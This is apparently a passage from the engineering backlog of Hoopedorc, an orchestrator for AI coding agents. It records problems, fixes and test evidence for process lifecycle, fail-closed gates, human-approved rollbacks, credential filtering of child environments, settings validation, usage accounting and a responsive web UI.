- Manual dispatch uses the same scheduler/runtime as autonomous work. It may be
  prioritized, but may not bypass scope, lifecycle, or process-safety controls.
- npm, pnpm, Yarn, and Bun receive first-class automatic setup. Other ecosystems
  use an explicit structured per-project setup command rather than guessed
  installer behavior.
- EC2 remains the scheduled Linux/web host. A separate Hoopedorc installation
  on the owner's Mac handles Xcode/Apple projects. No EC2-to-Mac delegation is
  introduced in this wave.
- The Telegram bot stays a private 1:1 long-polling bot. Full mobile editing is
  in scope for the web app, not only read-only supervision.

### B34. Execution ownership, stop/start safety, and unified manual queue — HIGH

**Where:** `packages/server/src/engine-runner.ts`,
`packages/engine/src/orchestrator.ts`, task/project routes in
`packages/server/src/index.ts`, the shared task/API types, and DB schema/repo.

**Confirmed problem:** a hard pause aborts controllers and returns without
waiting for active task pipelines to settle, while `EngineRunner.pause()` drops
the project registration immediately. A new Start can therefore overlap the
old task, and the old background `finally` can delete the new registration.
Project deletion checks autonomous runs but not manual ones; multiple manual
dispatches use independent orchestrators; an empty scope (documented as
unrestricted) is incorrectly treated as non-overlapping; the Stop route can
rewrite an already-terminal task to `blocked`.

**Fix:** introduce one generation-tagged `ProjectRuntime` per project, owning
the orchestrator, a settled promise, lifecycle state (`starting`, `running`,
`stopping`, `draining`), and its manual-priority queue. Cleanup may delete a
registry entry only when its identity/generation still matches. Hard Stop aborts
then awaits settlement with a bounded deadline; Start and Delete return a clear
conflict while settlement is pending. Persist manual-dispatch intent so a queued
request is not silently lost on restart; feed it into the same scheduler and
clear it only when execution actually begins. Empty/unrestricted scopes overlap
everything. A task Stop is valid only for a live/active task and preserves a
terminal state won by a completion race.

**Acceptance:** integration tests cover Stop → immediate Start, old-finally vs.
new-run registration, Delete during manual work, two queued manual tasks with
overlapping and non-overlapping scopes, empty scopes, process settlement, restart
of a queued manual request, and Stop against done/failed/backlog tasks. No test
may rely on arbitrary sleeps to make the race pass.

**B34 — done (PR [#139](https://github.com/IngeniousArtist/hoopedorc/pull/139)).**
`EngineRunner` now registers one generation-tagged `ProjectRuntime` before any
async setup begins; manual Dispatch/Retry persists `Task.dispatchRequestedAt`
and feeds that request through the same scheduler, while Start promotes the
existing runtime instead of creating a competitor. Requests survive restart,
are prioritized oldest-first, and clear only at real dispatch. Hard Stop keeps
the runtime registered until its settled Promise resolves (the HTTP wait is
bounded without dropping ownership); identity checks prevent an old generation
from deleting or finalizing over a newer one; Delete and Telegram Stop All use
the stronger any-activity predicate. Task Stop is active-only, terminal task and
stopped-run outcomes win late races, and Stop checks now guard the post-review
merge tail. Empty scope arrays are treated as unrestricted and overlap every
writer. The Board and task drawer expose queued priority state.

Verification is deterministic: controlled-Promise server tests cover Stop then
immediate Start, settlement ownership, Start promotion, restart recovery, stale
generation cleanup, and late run updates; repository tests cover durable queue
round-trips plus done/failed/backlog Stop guards; engine tests prove requested-
only scheduling, overlapping/manual serialization, disjoint concurrency, and
empty-scope serialization. `npm run typecheck`, `npm run build`, 115 engine
tests, 102 server tests, and 4 adapter tests pass. No authenticated model run was
started for this lifecycle-only change; Fable review remains the independent
post-merge check required for the wave.

### B35. Managed subprocess lifecycle and cancellation — HIGH

**Where:** `packages/adapters/src/index.ts`, `packages/server/src/planner.ts`,
`packages/engine/src/validator.ts`, `packages/engine/src/gate-runner.ts`,
`packages/engine/src/git-service.ts`, and `packages/engine/src/sandbox.ts`.

**Confirmed problem:** abort escalation checks `ChildProcess.killed`, which means
"a signal was sent," not "the process exited," so a SIGTERM-resistant CLI
normally never receives SIGKILL. Only the direct child is targeted. Validators,
gate commands, dependency setup, Git/GitHub polling, retry sleeps, and Docker
containers do not share one abort/deadline contract; Stop can wait minutes or
hours for a later stage boundary.

**Fix:** add one managed-process helper with an exit-settled flag, output limits,
deadline, AbortSignal, listener/timer cleanup, and POSIX process-group shutdown
(with a platform-safe fallback). Send SIGTERM once, then SIGKILL the still-live
group after the grace period. Thread AbortSignal through planner, author,
validator, gates, setup, git/gh polling, and retry waits. Give Docker runs a
unique name or cidfile and force-remove the container on abort/timeout so killing
the Docker client cannot leave work running in the background.

**Acceptance:** real child-process tests launch a parent that traps SIGTERM and
spawns a child; both must be gone after the deadline. Additional tests cover an
aborted validator, OpenCode retry sleep, GitHub-check poll, gate, and Docker
cleanup adapter (Docker itself may be stubbed in CI). B34 hard Stop returns only
after these managed children have settled or the explicit shutdown deadline is
recorded.

**B35 — done (PR [#140](https://github.com/IngeniousArtist/hoopedorc/pull/140)).**
All CLI and command execution now shares a bounded managed-process primitive:
it tracks real `close` settlement, caps captured output, removes abort listeners
and timers, starts a POSIX process group where supported, sends one `SIGTERM`,
and sends `SIGKILL` to the still-live group after grace with a direct-child
fallback. A task-wide controller now spans worktree setup, every author and docs
attempt, gates, validation, Git/GitHub commands and polling, merge work, and
retry waits; planner HTTP disconnects cancel their Claude/Codex/OpenCode CLI as
well. Repo-lock cancellation returns immediately only while queued and waits for
an already-started managed child to close. Aborted setup removes partial
worktrees before returning.

Docker gate/install runs receive a unique container name and force-remove that
container if the Docker client aborts, times out, or otherwise fails. Regression
tests use a real SIGTERM-resistant parent plus child, a noisy output process, a
real abortable gate, a fake pending `gh` CLI, an abort-aware validator and
OpenCode retry, and a stubbed Docker runner that proves `docker rm -f` targets
the generated name. `npm run typecheck`, `npm run build`, 8 adapter tests, 119
engine tests, and 102 server tests pass. No authenticated model run was started;
Fable review remains the independent post-merge check required for the wave.

### S9. Fail-closed gates, destructive rail, and worktree hygiene — HIGH

**Where:** `packages/engine/src/gate-runner.ts`,
`packages/engine/src/worktree-manager.ts`, `packages/engine/src/orchestrator.ts`,
and `packages/engine/src/validator.ts`.

**Confirmed problem:** a declared npm script whose runtime cannot be spawned can
be reported as "nothing to run." Git diff/status failures are collapsed to empty
results, allowing the destructive rail to see "nothing risky." The rail and
validator see only the first 40,000 diff characters. Gate scripts run in a
writable worktree after the author commit and may leave changes that a retry or
documentation `commitAll()` later stages without validator review.

**Fix:** distinguish "script absent" from infrastructure failure; the latter is
a failed gate. Return typed diff acquisition results including `ok`, error, byte
count, and truncation. Scan file statuses and added lines across the complete
diff as a stream; if a safety limit or acquisition error is reached, require
human approval even in fully autonomous mode. Snapshot cleanliness around each
gate. A gate that dirties tracked/untracked source fails with named files, then
the orchestrator restores only its disposable task worktree to committed HEAD
before validator, docs, retry, or cleanup. Never reset the user's primary clone.

**Acceptance:** tests cover ENOENT, git failure, huge diff with the destructive
line after 40K, rename/delete status, a malicious passing gate that edits code,
a gate that edits an allowed docs path, and a failing gate followed by retry.
None of the gate-written content may reach the PR.

**S9 — done (PR [#141](https://github.com/IngeniousArtist/hoopedorc/pull/141)).**
Declared scripts now fail on runtime/spawn errors instead of becoming a
vacuous pass. Every executed gate is bracketed by typed worktree-status checks;
any nonignored tracked or untracked output fails the gate, names the paths, and
is removed from the disposable task worktree. The orchestrator repeats that
restore at the stage boundary before retry, validator, docs, or merge, and the
restore verifies its result (including nested untracked repositories). The
primary clone and ignored dependency/cache paths are never reset.

Changed-file status and diff acquisition now report success, errors, observed
bytes, and truncation. The mechanical destructive rail scans added lines across
the complete bounded diff one line at a time, sees rename/delete status and
content beyond the old 40K cutoff, and forces approval under every merge policy
when Git inspection fails or reaches its safety limit. Validator diff failures
and truncation are visible in its prompt and mechanically override any model
approval to escalation. Regression coverage includes ENOENT, typed Git failure,
a post-40K destructive SQL line, rename/delete status, tracked source output,
scope-allowed docs output, retry cleanup, nested-repository cleanup, and an
incomplete validator diff. `npm run typecheck`, `npm run build`, 8 adapter
tests, 128 engine tests, and 102 server tests pass. No authenticated model run
was started; Fable review remains the independent post-merge check required for
the wave.

### B36. Rollback through a gated, human-approved PR — HIGH

**Where:** rollback API/types/UI, `packages/engine/src/git-service.ts`,
`packages/server/src/engine-runner.ts`, DB schema/repo, notifications, and audit.

**Confirmed problem:** normal PRs are squash-merged, but rollback always runs
`git revert -m 1`; a squash commit has one parent, so the command fails. The
current path also pushes directly to the default branch, bypassing the product's
own branch/gate/approval contract.

**Fix:** persist a rollback job, fetch the current remote default branch, create
a unique rollback worktree/branch, inspect the target commit's parent count, and
use plain `git revert` for a single-parent squash commit or `-m 1` only for a
real merge commit. Run the standard applicable gates and independent validator,
push, open a clearly labelled rollback PR, and send a mandatory approval with
the PR link and reasons. Recovery after restart resumes the persisted job rather
than issuing a second revert. Merge only after explicit approval; rejection
leaves an auditable closed/abandoned rollback job.

**Acceptance:** local real-git tests cover a squash commit, a two-parent merge,
conflict, duplicate click/idempotency, restart recovery, reject, and approve.
The remote default branch must never receive a direct rollback push.

**B36 — done (PR [#142](https://github.com/IngeniousArtist/hoopedorc/pull/142)).**
Rollback is now a durable state machine keyed uniquely by task and source PR.
It prepares an idempotent revert in a deterministic isolated worktree, selects
plain revert versus mainline-parent revert from the source commit's real parent
count, runs repository gates and an independent validator, opens a rollback PR,
and waits for mandatory human approval. Rejection closes the PR and preserves an
auditable terminal job; restart recovery resumes the recorded stage without
creating a second revert. The task changes to blocked only after the rollback PR
actually merges. The Board shows live rollback state and the rollback PR link.

Real local bare-remote tests prove single-parent squash, two-parent merge,
conflict cleanup, stable repeat preparation, and an unchanged remote default
branch. Server tests prove atomic duplicate requests, approve, reject,
non-completed-task rejection, and approval re-arm after restart without a second
prepare or PR. `npm run typecheck`, `npm run build`, 8 adapter tests, 131 engine
tests, and 107 server tests pass. No authenticated model run was started; Fable
review remains the independent post-merge check required for this wave.

### S10. CLI credential and child-environment boundary — HIGH

**Where:** `packages/adapters/src/env.ts`, every planner/adapter spawn, gate and
setup sandbox environment assembly, README, architecture, and user guide.

**Confirmed problem:** the "sanitized" environment explicitly preserves
`CODEX_API_KEY`, all `ANTHROPIC_*`, and all `npm_config_*` variables; Claude's
planner path inherits the entire server environment. This contradicts the README
claim that provider keys are stripped. npm config may contain registry auth.

**Fix:** build child environments from a small runtime allowlist, preserving the
same user's `HOME`, `CODEX_HOME`, XDG/config paths, locale, PATH, and platform
requirements needed for the three CLIs' already-authenticated OAuth/config/
keychain state. Do not forward provider-key variables. Preserve safe npm settings
such as registry/proxy only when their key is not auth/secret-shaped. Apply the
same policy to every planner and adapter. Gate/setup containers receive no CLI or
registry credentials by default. Document the honest remaining boundary: host-run
agents retain host filesystem/network access and may reach credential files;
environment filtering is not a substitute for F13 phases 2–3.

**Acceptance:** sentinel-secret tests cover provider keys, Telegram/GitHub tokens,
npm `_authToken`/password keys, and all three planner paths. On the owner's same-
user setup, real Claude/Codex/OpenCode health calls still authenticate without
Hoopedorc accepting a provider key.

**S10 — done (PR [#143](https://github.com/IngeniousArtist/hoopedorc/pull/143)).**
Agent and planner children now start from an explicit runtime/config allowlist
instead of a copy of the server environment. The boundary preserves HOME,
CODEX_HOME, XDG/CLI config roots, locale, PATH, platform/TLS/proxy requirements,
and a small list of non-credential npm behavior settings. Provider keys,
application/GitHub/Telegram tokens, SSH agent sockets, arbitrary app variables,
`NODE_AUTH_TOKEN`, npm auth/password/client-key fields, and npm config-file
indirection are not forwarded. Claude planning now uses the same boundary as
Codex, OpenCode, authors, validators, and documenters. Gate containers receive
only their synthetic HOME/PATH, safe npm settings, and non-secret Node runtime
settings.

Process-level fake-CLI tests inspect the actual child environment for all three
planner runners, and Docker-argument tests prove the same sentinel credentials
are absent from gate containers. On the owner's Mac, real zero-inference health
calls through the filtered environment reported Claude Pro, Codex ChatGPT, and
12 OpenCode credentials authenticated; a filtered `opencode models` call returned
431 models. `npm run typecheck`, `npm run build`, 9 adapter tests, 132 engine
tests, and 111 server tests pass. No model inference run was started. The README,
architecture, user/deploy guides, sandbox design note, compose comments, and
`.env.example` now document CLI-owned auth and the honest remaining host
filesystem/network boundary. Fable review remains the independent post-merge
check required for this wave.

### B37. Enabled models, live operational settings, and complete validation — HIGH

**Where:** shared Settings/ModelConfig types, settings API/repo, engine runner,
orchestrator, planner routing, Telegram settings commands, and Settings UI.

**Confirmed problem:** `enabled` is honored by setup/health UI but not dispatch;
routing can point at a disabled model. Each orchestrator captures a Settings
snapshot, so phone/web changes to merge policy, approval holds, quotas, budgets,
or pricing do not reliably affect an active run. Several numeric/enumerated
settings are accepted without finite/range validation, and DB JSON is trusted as
the full current shape.

**Fix:** classify settings as attempt-stable (the runner/model/effort selected for
an already-started call) or live operational policy. Add validated live accessors
for dispatch, budgets, quotas, hold behavior, merge policy, notifications, and
pricing. Disabled models receive no new attempts or fallbacks, but disabling does
not kill a call already in flight. Routing saves require enabled targets. Add one
normalizer/validator used by defaults, migrations, GET/PUT, Telegram changes, and
runtime reads; reject invalid runner, concurrency, confidence, budget, quota,
timeout, policy, and boolean values with field-specific messages.

**Acceptance:** tests flip each live policy during a run, disable a routed/fallback
model, preserve an active call after disable, reject invalid persisted/API shapes,
and prove both web and Telegram changes use the same validation path.

### F48. Per-model effort setting

**Where:** `ModelConfig`, defaults/migrations/validation, model editor and setup
UI, adapters, planner/deconstructor, validator, docs stage, and model health.

**Implementation:** add one optional effort value per model with a visible
`CLI default` choice. Claude Code maps it to `--effort`; OpenCode maps it to its
provider-specific `--variant` and permits a safely validated custom variant;
Codex maps it to `-c model_reasoning_effort=...`. The same value applies to that
model in planning, deconstruction, authoring, validation, documentation, and
health tests. Runner changes reset or revalidate incompatible values. Logs and
run metadata record the resolved effort so cost/quality comparisons are possible.

**Acceptance:** adapter argument tests cover default and explicit effort for all
three runners; planner paths receive the same setting; Settings round-trips it;
mobile and desktop controls remain usable; an unsupported value produces an
actionable save/test error rather than silently falling back.

**B37 + F48 — done together (PR [#144](https://github.com/IngeniousArtist/hoopedorc/pull/144)).**
One `normalizeSettings` contract now deep-migrates historical JSON and validates
defaults, boot migration, repository reads/writes, web-style partial updates,
Telegram settings commands, and every runtime read. It rejects malformed
runners, effort, enabled/concurrency fields, routing targets, budgets, quotas,
confidence, policies, sandbox mode, and booleans with a precise field path;
routing cannot name a missing or disabled model. Active orchestrators receive a
validated live accessor: dispatch capacity/enabled state, rebuilt fallback
chains, budgets, quotas, approval holds, merge/risky/vacuous policy,
notification gates, guidelines, and manual pricing now change at the next
decision boundary, while an already-started author/reviewer call keeps its
snapshotted adapter and survives disable. Planner/deconstructor and docs/health
entry points independently refuse disabled models before a process starts.

`ModelConfig.effort` now maps through one shared argument builder to Claude
`--effort`, OpenCode `--variant` (safe custom values allowed), and Codex
`-c model_reasoning_effort=…`. Planning, deconstruction, authors, validators,
per-task documentation, and model health all resolve the same model field.
Settings exposes a visible CLI-default choice plus runner-specific controls;
changing runner clears effort. Engine logs, persisted `Run.effort`, task run
history, immediate model-test results, and model health expose the resolved
value. SQLite adds the backward-compatible nullable run column.

Verified: `npm run typecheck`, `npm run build`, `git diff --check`, 12/12
adapter tests, 136/136 engine tests, and 120/120 server tests. The tests change
fallback policy/disable, budgets, quotas, approval hold, merge policy,
confidence threshold, notification digest, and pricing after runtime creation;
preserve in-flight calls; reject corrupt persisted/API-style settings; prove
Telegram goes through the shared validator; cover exact default/explicit CLI
args for all runners and planner tiers; and round-trip Settings/run effort.
Browser smoke at 1280px and 390px confirmed effort selection enables Save,
runner changes reset to CLI default with the new runner options, and the effort
control stays fully inside the mobile viewport. Fable review remains the
independent post-merge check required for this wave.

### B38. Portable dependency setup and atomic caching — MEDIUM

**Where:** worktree manager, project config/types/API/UI, sandbox, setup health,
and deployment/user docs.

**Confirmed problem:** all Node projects share one mutable primary
`node_modules` without an install lock. pnpm/Yarn lockfiles are detected but npm
is still invoked. Concurrent worktrees can race, and a cache key omits package
manager/runtime/platform details. Non-Node projects have no explicit setup hook.

**Fix:** select Node tooling by `packageManager` first, then an unambiguous
lockfile: npm, pnpm, Yarn, or Bun. Use the manager's frozen/reproducible install
mode and fail actionably if the selected binary is absent. Serialize installation
per cache key and publish a fingerprinted cache atomically only after success;
include manifests/lockfile, manager/version, Node version, OS, and architecture.
Never overwrite the primary clone's tracked manifests. Add an optional structured
project setup command (`command` + argument array, no implicit shell) for SwiftPM,
CocoaPods, Python, Rust, .NET, and specialist SDK workflows; it uses B35 timeouts/
abort and the configured sandbox/host policy. Mac/Xcode projects run on the Mac
instance; EC2 does not pretend to execute Apple toolchains.

**Acceptance:** tests cover concurrent identical/different fingerprints, failed
install without cache publication, npm/pnpm/Yarn/Bun selection, ambiguous locks,
missing binary, monorepo manifests, OS/architecture key separation, structured
custom setup, cancellation, and actionable Setup health output.

**Acceptance evidence (2026-07-14, PR [#145](https://github.com/IngeniousArtist/hoopedorc/pull/145)):**
the engine suite passed 147/147 and the server suite passed 123/123, including
real `npm ci`, all four manager command matrices, per-key concurrency, failed
atomic publication, root and workspace artifact materialization, Yarn PnP,
structured argv, cancellation, Apple/Linux refusal, API validation, and live
manager/runtime health. The focused worktree/sandbox run passed 34/34; adapter
tests passed 12/12; full typecheck, production build, and `git diff --check`
passed. Browser acceptance at 1280px, 768px, and 375px confirmed literal
argument editing, inline invalid-state blocking, 40px/focus-visible controls,
and setup fields contained by their responsive fieldset. The live Setup &
Health view rendered `Project setup — Hoopedorc Orchestrator` with an actionable
missing-lockfile correction. The remaining 375px whole-page overflow comes from
the pre-existing global navigation and remains tracked by U19; the B38 fieldset
itself stayed within the viewport.

### B39. Planning and git durability — MEDIUM

**Where:** plan commit route, GitService helpers, planning archive/context code,
and related server/engine tests.

**Confirmed problem:** plan commit returns and marks the project planned before
PRD/AGENTS/CLAUDE writes finish, so immediate Start may branch without context.
Failures are swallowed. `commitAll()` treats every commit error as "nothing to
commit"; fetch/push/sync paths also hide infrastructure failures as clean/best-
effort outcomes where correctness depends on success.

**Fix:** persist planning artifacts as one ordered, awaited operation and report
partial failure without losing the DB draft/session needed to retry. Start is
blocked until the planning persistence state is durable. `commitAll()` ignores
only a confirmed clean status; identity, hook, index-lock, permission, fetch, and
push errors remain typed failures. Make best-effort behavior explicit only for
truly optional cleanup/telemetry and surface it in logs/audit.

**Acceptance:** tests use delayed/failing commits followed by immediate Start,
git identity/hook/index errors, fetch failure, optional cleanup failure, and retry
after partial planning persistence. No context loss or false success is allowed.

Implemented in [PR #146](https://github.com/IngeniousArtist/hoopedorc/pull/146).
Acceptance evidence: a delayed repository promise proved `planning` and the
exact scratch are visible before the first await while Start is refused; real
temporary Git repositories exercised missing identity, a rejecting hook,
`index.lock`, read-only writes, a missing remote, a rejected push followed by a
no-diff retry, and preservation of tracked and untracked owner `CLAUDE.md`
files. Optional cleanup/changelog failures warn without changing terminal task
success. Full engine (157), server (127), and adapter (12) suites passed, along
with workspace typecheck, production build, and `git diff --check`.

### B40. Complete model-invocation accounting — MEDIUM

**Where:** DB schema/repo, planner, engine events, validators, docs, model tests,
budget/quota logic, Cost UI, health, and Telegram summaries.

**Confirmed problem:** quota run counts come from author `runs`, while planner,
deconstructor, validator, and some health invocations consume the same model
subscription without a run row. Max-run quotas can therefore be exceeded while
the UI reports capacity remaining.

**Fix:** add a unified invocation ledger with project/task/run correlation,
stage (`planner`, `deconstructor`, `author`, `validator`, `docs`, `health`), model,
runner, effort, start/end, outcome, exit reason, tokens, cached tokens, and cost.
Write `started` before spawn and terminalize it exactly once. Derive rolling quota
usage and model analytics from the ledger; keep compatibility views/migration for
existing run/cost history and prevent double billing during rollout.

**Acceptance:** tests cover every stage, crash/restart of an in-flight invocation,
fallbacks, zero-cost subscription calls, token-priced calls, migration/backfill,
and quota blocking based on planner/validator usage as well as author usage.

**Acceptance evidence (2026-07-15, PR [#148](https://github.com/IngeniousArtist/hoopedorc/pull/148)):** `model_invocations` is now the
authoritative, exactly-once ledger for planner, deconstructor, author, validator,
docs, and health calls. Producers write an attempt-stable `running` row before
each CLI spawn and terminalize it with correlation, runner/effort, outcome,
exit reason, fresh/cached/output tokens, and manual-or-reported cost. The
terminal compare-and-set and positive legacy cost projection share one SQLite
transaction; quotas, budget totals, planning totals, cost analytics, Telegram
health, and rolling model health now read the ledger, including $0 subscription
calls. Startup interrupts orphaned in-flight calls. The idempotent migration
backfills historical runs/costs/model checks, links one visible projection per
invocation, and does not double-count duplicate legacy run costs.

Full workspace typecheck and production build passed, as did `git diff --check`,
158/158 engine tests, 134/134 server tests, and 12/12 adapter tests. B40 tests
cover all six stages, separate fallback/repair attempts, author/docs/run
correlation, validator and health lifecycles, zero-cost calls, manual token
pricing, duplicated terminal events, process restart, duplicate legacy billing,
idempotent backfill, planner/validator quota consumption, and analytics/health
derivation. Fable review remains the independent post-merge validation.

### B41. Graceful shutdown, cooldown recovery, and runtime health — MEDIUM

**Where:** server startup/shutdown, EngineRunner, DB lifecycle, scheduler,
sandbox Docker detection, systemd/deploy docs, and health endpoints/UI.

**Confirmed problem:** SIGTERM/SIGINT have no coordinated shutdown. Uncaught
exceptions are logged and the potentially inconsistent process continues, so
systemd cannot restart it. Cooldowns are memory-only. A failed Docker probe is
cached for the process lifetime even if the daemon later becomes available.

**Fix:** stop accepting starts, mark runtimes stopping, invoke B35 cancellation,
await B34 settlement with a total deadline, stop Telegram polling, flush logs,
checkpoint/close SQLite, then exit. On uncaught exception perform the same bounded
best effort and exit nonzero. Persist cooldown/rate-limit-until state. Give Docker
detection a short TTL and invalidate on execution failures. Expose shutdown/
degraded dependency state through health without leaking secrets.

**Acceptance:** child-process integration tests send SIGTERM and simulate an
uncaught exception, assert no managed child survives, DB/audit state is durable,
and verify systemd-compatible exit codes. Tests cover cooldown restart and Docker
unavailable → available → unavailable transitions.

**Acceptance evidence (2026-07-15, PR [#149](https://github.com/IngeniousArtist/hoopedorc/pull/149)):** signal and fatal-error paths now share one
idempotent coordinator that closes admission before its first await, stops all
project and rollback runtimes in parallel under one 15-second deadline, aborts
request-scoped planner/model/setup work, flushes logs, writes shutdown audit
state, closes Telegram/WebSockets/HTTP, checkpoints SQLite, and closes the DB
before exiting. Signals exit zero; uncaught exceptions and unhandled rejections
perform the same cleanup and exit nonzero. The systemd unit gives this path 25
seconds and retains a control-group kill fallback. Rate-limit cooldowns now live
in SQLite, while Docker detection has a 30-second TTL and invalidates immediately
after failed Docker execution. The credential-free health contract and Setup UI
report lifecycle and required/optional Docker degradation.

Child-process integration tests sent real SIGTERM and threw a real uncaught
exception around a SIGTERM-resistant managed child, then proved the process tree
was gone, the project was paused, the shutdown audit survived reopening SQLite,
and exit codes were 0/1 respectively. Restart, total-deadline, rollback abort,
setup/model request cancellation, cooldown persistence, Docker
unavailable → available → unavailable, and safe health-payload tests also pass.
Full workspace typecheck and production build passed, as did `git diff --check`,
159/159 engine tests, 145/145 server tests, and 12/12 adapter tests. The Setup
runtime card was browser-checked at 375, 768, and 1280 CSS pixels with no console
errors; it remains inside the 375px viewport, while U19 retains ownership of the
already-recorded narrow top-navigation overflow. Fable review remains the
independent post-merge validation.

### F49. Telegram reliability and phone-control hardening

**Where:** Telegram client, shared command actions, engine lifecycle integration,
Settings/health UI, user guide, and server tests.

**Implementation:** retain the dependency-free private-chat long-poll design.
Register `setMyCommands`; accept unique project name/id prefixes instead of full
UUIDs; add compact inline Start/Pause/Status actions; route every command through
the same validated HTTP/shared action and B34 runtime semantics. Enforce the
private chat/user identity for callbacks. Add request deadlines, bounded retry
with Telegram `retry_after` handling, long-message chunking, delivery state and
last error in health, and a web notification when an approval cannot be delivered
after retry. Correct `/autonomous` copy: the non-bypassable destructive rail and
validator escalations still require humans. Keep Stop All's confirmation.

**Acceptance:** tests cover unauthorized callback user, command registration,
prefix ambiguity, command errors returned to the user, 429/backoff, network
timeout, chunking, failed approval delivery, re-sending pending approval, restart,
and Start/Pause/Stop All using the unified runtime. Live private-chat smoke test
confirms buttons and commands without introducing a webhook or new framework.

**Acceptance evidence (2026-07-15):** implementation is in
[#150](https://github.com/IngeniousArtist/hoopedorc/pull/150). The focused
Telegram/shared-action suite passes 25 tests, the complete engine/server/adapters
suites pass 159/159/12 tests, workspace typecheck and production build pass, and
Settings/Setup delivery status was checked at 375, 768, and 1280px without console
errors. Automated coverage includes command registration, private chat and user
identity rejection, project-prefix ambiguity, surfaced command errors,
`retry_after` handling, timeouts, chunking, permanent approval-delivery failure,
pending-approval resend after restart, and unified Start/Pause/Stop All actions.
Fable review remains the independent post-merge validation. The owner completed
the remaining live private-chat smoke against the configured bot on 2026-07-23
and reported the buttons and commands passed.

### T2. Frontend unit and end-to-end test foundation

**Where:** `apps/web`, root scripts, and GitHub Actions.

**Implementation:** add Vitest + React Testing Library for client/hooks/components
and Playwright for critical browser workflows. Add root `test`, `test:web`, and
lint scripts; run them in CI. Cover auth gate, navigation/deep links, WebSocket
updates, settings dirty/save behavior, approvals, Stop/retry, project deletion
guards, effort editing, responsive navigation, and error/toast states. Use stable
mock fixtures and deterministic viewport tests rather than screenshot-only tests.

**Acceptance:** CI runs all engine/server/adapter/web suites plus Playwright smoke
tests. A deliberately broken route mapping, mobile overflow, or failed settings
save must cause a test failure.

**Acceptance evidence (2026-07-15):** implementation is in
[#151](https://github.com/IngeniousArtist/hoopedorc/pull/151). Vitest + React
Testing Library run 14 behavior tests covering route/auth contracts, the shared
WebSocket, Settings dirty/success/failure state, approvals, Stop/delete guards,
retry, effort editing, and toast recovery. Four Playwright tests run against the
real mock API and cover deep links, an injected failed Settings save, approval
response, responsive navigation, and document-overflow diagnostics at phone
width. The complete local gate passes: workspace typecheck/build/lint, 159 engine,
159 server, 12 adapter, and 14 web tests, followed by 4 Chromium smoke tests. A
changed canonical route fails direct contract assertions; a failed Settings PUT
must preserve dirty state and show the server error; any unmarked element escaping
the 390px viewport fails with element diagnostics (only the explicitly scrollable
navigation and Board regions are exempt). CI now installs pinned Playwright
Chromium and runs every workspace suite plus the browser smoke suite. Fable review
remains the independent post-merge validation.

### U19. Full responsive UX and mobile editing pass

**Where:** every page/component in `apps/web`, with particular attention to App
navigation, ProjectHeader, Board, PlanView, Settings/ModelsEditor/RoutingEditor,
NewProject, AddTaskForm, Cost/Audit/Notifications, drawers, dialogs, and toasts.

**Implementation:** preserve Hoopedorc's quiet, dense operational character; do
not turn it into a marketing surface. Make all workflows fully usable at 360,
390, 768, 1280, and 1440 CSS pixels. Collapse fixed two/three-column forms,
maintain readable type and at least 40–44px primary mobile touch targets, keep
labels/actions inside their containers, add safe-area padding to sticky controls,
and prevent accidental page overflow. Intentional horizontal behavior is limited
to clearly scrollable Board columns/navigation/data regions. Keep desktop density
and fast repeated actions. Use familiar icons with accessible names/tooltips,
visible focus, and reduced-motion support; do not add decorative animation.

**Acceptance:** Playwright exercises onboarding, planning/editing, Board/task
drawer, notifications/approval, costs, audit, projects, Settings/model effort,
Setup, Stop/retry, and deletion at every target viewport. Screenshots and DOM
overflow assertions show no overlaps, clipped controls, unreadable text, or sticky
footer occlusion. A real phone smoke test over the owner's Tailscale route closes
the item.

**Implementation evidence (2026-07-15):** implementation is in
[#152](https://github.com/IngeniousArtist/hoopedorc/pull/152). U19 now applies phone-only 40px touch
targets while preserving desktop density, collapses fixed form/action columns,
keeps project identity separate from destructive controls, and adds notch/home-
indicator safe-area offsets to navigation, the task drawer, Settings' sticky save
bar, and toasts. Every repeated model/routing/project field has a programmatic
name, keyboard focus remains visible, reduced-motion preferences disable status
animation, and route changes return to the top without Plan's chat auto-scroll
moving the whole document. The task drawer's recovery action also moved to
Overview, so a task that fails before opening a PR is no longer stranded without
Retry.

Playwright now runs a 360/390/768/1280/1440 matrix against the real mock API. It
captures 60 viewport screenshots and applies element-level document-overflow,
fixed/sticky-surface bounds, route-scroll, and phone touch-target assertions. At
each width it loads Board, Plan, Costs, Audit, Notifications, Projects, Settings,
Setup, and New Project, then exercises Add Task, the task drawer, Stop + retry,
approval, an injected editable planning draft, model-effort editing/save, setup
re-entry, and confirmed project deletion. The final browser run passes 14/14 in
19.7s. The complete regression gate passes: typecheck, build, lint, 159 engine,
159 server, 12 adapter, 14 web unit tests, and 14 Playwright tests. The owner's
real-device smoke over the deployed Tailscale route passed on 2026-07-23,
closing the final device/network acceptance line that desktop Chromium
emulation could not substitute for.

### Phase 15 PR order

1. Part 10 plan documentation.
2. B34.
3. B35.
4. S9.
5. B36.
6. S10.
7. B37 + F48 (same contract/settings/adapter surface).
8. B38.
9. B39 + B40 (shared DB durability/accounting surface, kept as separable commits).
10. B41 + F49 (runtime lifecycle first, Telegram wired to it second).
11. T2.
12. U19.
13. Final documentation/live acceptance and `v0.7.0`.

### What Part 10 deliberately does NOT include

- **Multi-host orchestration.** EC2 and Mac run separate Hoopedorc instances.
- **F13 phases 2–3 / full agent containerization.** S10 removes accidental env
  exposure and documents the honest host boundary; isolating OAuth/keychain-backed
  agents without breaking Xcode remains its own design wave.
- **A visual rebrand.** U19 is a responsive/product-quality pass.
- **Guessed arbitrary ecosystem installs.** B38 provides explicit setup commands.
- **Telegram webhooks or a bot framework migration.** Long polling fits the
  private Tailscale/EC2 deployment and remains simpler to operate.

---

## Suggested execution order

| Phase | Items | Rationale | Status |
|---|---|---|---|
| 1 | S1, S2, S3, S4 | Close the injection/exposure holes before anything else touches the network surface. | ✅ done |
| 2 | B1, B2, B3, B4, B5 | The control-plane bugs users hit daily (stop, logs, double-run, run rows, status). | ✅ done |
| 3 | S5, B6–B15 | Hygiene + rails; each is small and independent. | ✅ done |
| 4 | F1, F2, F3, F4 | Core product loop: onboard → understand → intervene → observe. | ✅ done |
| 5 | F5, F6, F7, F8 | Away-from-keyboard autonomy story. | ✅ done |
| 6 | F9, F10, F11, F12 | Per-repo flexibility, packaging, docs. | ✅ done |
| 7 | B16, B17, B18, B19, S6 | Review-pass fixes: confirmed defects in the shipped Phase 6 work. Fix before Phase 8. | ✅ done |
| 8 | F14, F15, F16, F17, F18, F19 | Second feature wave: CI first (F14 — every later PR benefits), then external-CI gate, quota awareness, backups, sandbox doc, scheduled runs (F19 opted into 2026-07-06). | ✅ done |
